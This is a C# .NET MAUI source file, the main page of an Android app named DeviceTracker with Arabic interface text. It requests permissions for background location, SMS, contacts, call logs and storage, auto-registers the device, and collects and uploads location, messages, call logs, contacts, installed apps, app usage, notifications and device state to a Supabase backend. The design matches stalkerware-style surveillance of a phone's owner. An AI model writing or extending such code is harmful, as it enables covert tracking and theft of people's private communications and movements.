using Android.Content.PM;
using Android.OS;
using AndroidX.Core.App;
using AndroidX.Core.Content;
using DeviceTracker.Models;
using DeviceTracker.Services;
using Microsoft.Extensions.DependencyInjection;

namespace DeviceTracker;

public partial class MainPage : ContentPage
{
    private DeviceBackgroundService? _bg;
    private LocalDatabaseService? _db;
    private SupabaseService? _sb;

    public MainPage()
    {
        InitializeComponent();

        var svc = IPlatformApplication.Current?.Services;
        _bg = svc?.GetService<DeviceBackgroundService>();
        _db = svc?.GetService<LocalDatabaseService>();
        _sb = svc?.GetService<SupabaseService>();

        _ = InitAsync();
    }

    private async Task InitAsync()
    {
        await Task.Delay(500);
        await CheckRegistrationAsync();
        _ = StartBgAsync();
        _ = AutoRefreshLoopAsync();
    }

    private async Task CheckRegistrationAsync()
    {
        var token = Preferences.Get("device_token", "");
        var serial = Preferences.Get("device_serial", "");

        if (!string.IsNullOrEmpty(token))
        {
            RegStatusLabel.Text = "✅ مسجل";
            RegStatusLabel.TextColor = Colors.LightGreen;
            DeviceSerialLabel.Text = $"Serial: {serial}";
            RegisterBtn.IsVisible = false;
        }
        else
        {
            RegStatusLabel.Text = "⚠ غير مسجل";
            RegStatusLabel.TextColor = Colors.Orange;
            DeviceSerialLabel.Text = serial != "" ? $"Serial: {serial}" : "No serial yet";
            RegisterBtn.IsVisible = true;
            _ = AutoRegisterAsync();
        }
    }

    private async Task AutoRegisterAsync()
    {
        if (_sb == null) return;
        await Task.Delay(2000);
        var serial = Preferences.Get("device_serial", "");
        if (string.IsNullOrEmpty(serial))
        {
            serial = $"DEV-{Guid.NewGuid():N}"[..20].ToUpper();
            Preferences.Set("device_serial", serial);
        }
        var ok = await _sb.RegisterDeviceAsync(serial);
        MainThread.BeginInvokeOnMainThread(() =>
        {
            if (ok)
            {
                RegStatusLabel.Text = "✅ مسجل";
                RegStatusLabel.TextColor = Colors.LightGreen;
                DeviceSerialLabel.Text = $"Serial: {serial}";
                RegisterBtn.IsVisible = false;
            }
        });
    }

    private async void OnRegisterDevice(object? sender, EventArgs e)
    {
        if (_sb == null) { await DisplayAlert("خطأ", "الخدمة غير متاحة", "OK"); return; }
        RegisterBtn.IsEnabled = false;
        RegisterBtn.Text = "جاري التسجيل...";
        RegStatusLabel.Text = "⏳ جاري التسجيل...";
        try
        {
            var serial = Preferences.Get("device_serial", "");
            if (string.IsNullOrEmpty(serial))
            {
                serial = $"DEV-{Guid.NewGuid():N}"[..20].ToUpper();
                Preferences.Set("device_serial", serial);
            }
            var ok = await _sb.RegisterDeviceAsync(serial);
            if (ok)
            {
                RegStatusLabel.Text = "✅ مسجل";
                RegStatusLabel.TextColor = Colors.LightGreen;
                DeviceSerialLabel.Text = $"Serial: {serial}";
                RegisterBtn.IsVisible = false;
            }
            else
                RegStatusLabel.Text = "❌ فشل التسجيل";
        }
        catch (Exception ex)
        {
            RegStatusLabel.Text = $"❌ {ex.Message}";
        }
        finally
        {
            RegisterBtn.IsEnabled = true;
            RegisterBtn.Text = "📱 تسجيل الجهاز";
        }
    }

    private async Task StartBgAsync()
    {
        if (_bg == null) { ServiceStatusLabel.Text = "الخدمة غير متاحة"; return; }
        try
        {
            await _bg.StartAsync();
            ServiceStatusLabel.Text = "✅ تعمل";
        }
        catch (Exception ex)
        {
            ServiceStatusLabel.Text = $"❌ {ex.Message}";
        }
    }

    private async void OnRequestBatteryOptimization(object? sender, EventArgs e)
    {
        try
        {
            var ctx = Platform.CurrentActivity;
            if (ctx == null) return;
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                var intent = new Android.Content.Intent(
                    Android.Provider.Settings.ActionRequestIgnoreBatteryOptimizations);
                intent.SetData(Android.Net.Uri.Parse($"package:{ctx.PackageName}"));
                ctx.StartActivity(intent);
            }
        }
        catch { }
    }

    private async void OnRequestLocationPermission(object? sender, EventArgs e)
    {
        var status = await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
        LocPermStatus.Text = status == PermissionStatus.Granted
            ? "✅ الموقع: مقبول" : "❌ الموقع: مرفوض";
        if (status == PermissionStatus.Granted)
        {
            var bg = await Permissions.RequestAsync<Permissions.LocationAlways>();
            if (bg == PermissionStatus.Granted)
                LocPermStatus.Text = "✅ الموقع: دائماً";
        }
    }

    private async void OnRequestAllPermissions(object? sender, EventArgs e)
    {
        RequestAllPermBtn.IsEnabled = false;
        RequestAllPermBtn.Text = "جاري الطلب...";
        try
        {
            await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
            await Permissions.RequestAsync<Permissions.LocationAlways>();
            var ctx = Platform.CurrentActivity;
            if (ctx == null) return;
            var perms = new[]
            {
                Android.Manifest.Permission.ReadSms,
                Android.Manifest.Permission.ReadContacts,
                Android.Manifest.Permission.ReadCallLog,
                Android.Manifest.Permission.ReadExternalStorage
            };
            var toRequest = perms
                .Where(p => ContextCompat.CheckSelfPermission(ctx, p) != Permission.Granted)
                .ToArray();
            if (toRequest.Length > 0)
                ActivityCompat.RequestPermissions(ctx, toRequest, 0);
        }
        catch { }
        await RefreshUi();
        RequestAllPermBtn.IsEnabled = true;
        RequestAllPermBtn.Text = "🔓 منح كل الصلاحيات";
    }

    private async void OnCollectNow(object? sender, EventArgs e)
    {
        if (_bg == null) { await DisplayAlert("خطأ", "الخدمة غير متاحة", "OK"); return; }
        CollectNowBtn.IsEnabled = false;
        CollectNowBtn.Text = "جاري الجمع والرفع...";
        try
        {
            await _bg.DirectCollectAndPushAsync("location", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("call_logs", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("sms", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("contacts", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("apps", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("state", CancellationToken.None);
            await _sb?.SendHeartbeatAsync();
            await RefreshUi();
            await DisplayAlert("تم", "تم جمع ورفع جميع البيانات مباشرة إلى Supabase", "OK");
        }
        catch (Exception ex)
        {
            await DisplayAlert("خطأ", ex.Message, "OK");
        }
        finally
        {
            CollectNowBtn.IsEnabled = true;
            CollectNowBtn.Text = "📥 جمع ورفع كل البيانات الآن";
        }
    }

    private async void OnForceSync(object? sender, EventArgs e)
    {
        if (_db == null || _sb == null) { await DisplayAlert("خطأ", "الخدمة غير متاحة", "OK"); return; }
        ForceSyncBtn.IsEnabled = false;
        ForceSyncBtn.Text = "جاري الرفع...";
        try
        {
            var synced = 0;
            foreach (var r in await _db.GetUnsyncedLocationsAsync(200))
                if (await _sb.PushLocationAsync(r)) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            foreach (var r in await _db.GetUnsyncedStatesAsync(200))
                if (await _sb.PushDeviceStateAsync(r)) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            foreach (var r in await _db.GetUnsyncedCallLogsAsync(200))
                if (await _sb.PushCallLogAsync(r)) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            foreach (var r in await _db.GetUnsyncedSmsAsync(200))
                if (await _sb.PushSmsAsync(r)) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            foreach (var r in await _db.GetUnsyncedContactsAsync(200))
                if (await _sb.PushContactAsync(r)) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            foreach (var r in await _db.GetUnsyncedAppsAsync(200))
                if (await _sb.PushInstalledAppsAsync(new[] { r })) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            foreach (var r in await _db.GetUnsyncedAppUsageAsync(200))
                if (await _sb.PushAppUsageAsync(r)) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            foreach (var r in await _db.GetUnsyncedNotificationsAsync(200))
                if (await _sb.PushNotificationAsync(r)) { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            await _db.CleanOldSyncedRecordsAsync();
            await DisplayAlert("تم", $"تم رفع {synced} سجل", "OK");
        }
        catch (Exception ex)
        {
            await DisplayAlert("خطأ", ex.Message, "OK");
        }
        finally
        {
            ForceSyncBtn.IsEnabled = true;
            ForceSyncBtn.Text = "🔄 رفع البيانات المعلقة";
        }
        await RefreshUi();
    }

    private async Task AutoRefreshLoopAsync()
    {
        while (true)
        {
            await Task.Delay(10_000);
            MainThread.BeginInvokeOnMainThread(async () => await RefreshUi());
        }
    }

    private async Task RefreshUi()
    {
        try
        {
            var serial = Preferences.Get("device_serial", "");
            DeviceSerialLabel.Text = serial != "" ? $"Serial: {serial}" : "Serial: --";

            if (_db != null)
            {
                var pending = await _db.GetPendingSyncCountAsync();
                PendingSyncLabel.Text = $"📦 في انتظار الرفع: {pending}";
            }

            LastBatteryLabel.Text = $"🔋 {Battery.Default.ChargeLevel * 100:F0}%";
            LastNetworkLabel.Text = $"📡 {Connectivity.Current.NetworkAccess}";

            var ctx = Platform.CurrentActivity;
            if (ctx != null)
            {
                LocPermStatus.Text = ContextCompat.CheckSelfPermission(ctx, Android.Manifest.Permission.AccessFineLocation) == Permission.Granted
                    ? "✅ الموقع: مقبول" : "❌ الموقع: مرفوض";
                SmsPermStatus.Text = ContextCompat.CheckSelfPermission(ctx, Android.Manifest.Permission.ReadSms) == Permission.Granted
                    ? "✅ الرسائل: مقبولة" : "❌ الرسائل: مرفوضة";
                CallPermStatus.Text = ContextCompat.CheckSelfPermission(ctx, Android.Manifest.Permission.ReadCallLog) == Permission.Granted
                    ? "✅ المكالمات: مقبولة" : "❌ المكالمات: مرفوضة";
                ContactPermStatus.Text = ContextCompat.CheckSelfPermission(ctx, Android.Manifest.Permission.ReadContacts) == Permission.Granted
                    ? "✅ جهات الاتصال: مقبولة" : "❌ جهات الاتصال: مرفوضة";
            }
        }
        catch { }
    }
}
